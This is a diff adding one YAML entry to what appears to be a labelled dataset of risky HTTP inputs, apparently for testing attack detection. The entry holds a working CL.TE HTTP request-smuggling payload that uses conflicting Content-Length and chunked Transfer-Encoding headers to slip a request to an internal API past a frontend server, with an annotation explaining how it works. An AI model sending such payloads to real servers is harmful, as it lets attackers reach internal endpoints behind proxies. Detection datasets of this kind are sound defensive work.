@@ -1,0 +1,26 @@
+id: TR150.httpheaders.http-request-smuggling-clte
+label: risky
+type: httpheaders
+references:
+  - metaref: http-request-smuggling-clte
+  - payload/author: Kahlhofer, Mario
+  - payload/license: CC-BY-4.0
+annotations:
+  - risk/type: attack
+  - risk/risky-lines: "L6-10"
+  - risk/present-attack: httpheaders-request-smuggling-clte
+  - risk/description: >-
+      The frontend server processes the full request because it reads the `Content-Length`.
+      The backend server processes the request as a chunked request because it reads the `Transfer-Encoding`.
+      Thus, the backend processes the first chunk of zero length, and will treat `POST /internal.api` as a new request.
+data: |-
+  POST / HTTP/1.1
+  Host: tools.internal.dynatrace.com
+  Content-Length: 66
+  Transfer-Encoding: chunked
+
+  0
+
+  POST /internal.api HTTP/1.1
+  Host: localhost
+  Content-Length: 0
